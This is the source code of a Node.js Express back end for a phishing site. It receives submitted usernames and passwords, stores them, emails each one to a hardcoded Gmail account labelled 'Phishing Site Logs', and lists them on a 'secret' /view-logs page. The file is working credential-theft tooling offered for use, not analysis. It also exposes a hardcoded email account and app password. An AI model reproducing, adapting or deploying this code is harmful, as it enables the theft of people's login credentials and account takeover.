const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// --- In-Memory Database to Store Credentials ---
// This array will hold all captured submissions.
// It will reset every time the server restarts.
const capturedCredentials = [];

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public'))); // For serving static files if needed

// --- Nodemailer Configuration (Optional - you can remove this) ---
// We are keeping this in case you want emails AND logs.
const nodemailer = require('nodemailer');
const transporter = nodemailer.createTransport({
  service: 'gmail',
  secure: true,
  port: 465,
  auth: {
    user: 'locanmash@gmail.com', 
    pass: 'lrfm zrsa beyu scwh' 
  }
});

// A simple route to test if the server is running
app.get('/', (req, res) => {
  res.send('Backend server is running!');
});

// The main route to handle credential submissions
app.post('/api/credentials', (req, res) => {
  const { username, password, page } = req.body;

  // --- Store credentials in the in-memory database ---
  const submission = {
    timestamp: new Date().toISOString(),
    username,
    password,
    page
  };
  capturedCredentials.push(submission);
  console.log('Credentials stored:', submission);

  // --- (Optional) Still send an email if you want ---
  const mailOptions = {
    from: '"Phishing Site Logs" <locanmash@gmail.com>',
    to: 'locanmash@gmail.com',
    subject: 'New Login Credentials Captured',
    text: `You have a new submission.\n\nPage: ${page}\nUsername: ${username}\nPassword: ${password}`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Error sending email:', error);
    } else {
      console.log('Email sent: ' + info.response);
    }
  });
  // --- End of optional email section ---

  res.status(200).json({ message: 'Credentials received successfully!' });
});

// --- NEW SECRET ROUTE TO VIEW LOGS ---
// This is a simple, unstyled HTML page to view the captured data.
app.get('/view-logs', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Captured Credentials</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f0f2f5; color: #333; margin: 0; padding: 20px; }
            .container { max-width: 800px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            h1 { color: #1da1f2; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
            th { background-color: #1da1f2; color: white; }
            tr:nth-child(even) { background-color: #f2f2f2; }
            .no-creds { text-align: center; color: #888; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Captured Credentials Log</h1>
            <p>Refresh to view the latest submissions.</p>
            ${capturedCredentials.length === 0 
                ? '<p class="no-creds">No credentials captured yet.</p>' 
                : `
                    <table>
                        <thead>
                            <tr>
                                <th>Timestamp</th>
                                <th>Page</th>
                                <th>Username</th>
                                <th>Password</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${capturedCredentials.map(cred => `
                                <tr>
                                    <td>${cred.timestamp}</td>
                                    <td>${cred.page}</td>
                                    <td>${cred.username}</td>
                                    <td>${cred.password}</td>
                                </tr>
                            `).join('')}
                        </tbody>
                    </table>
                `
            }
        </div>
    </body>
    </html>
  `);
});


// Start the server
app.listen(PORT, () => {
  console.log(`Server is listening on port ${PORT}`);
});
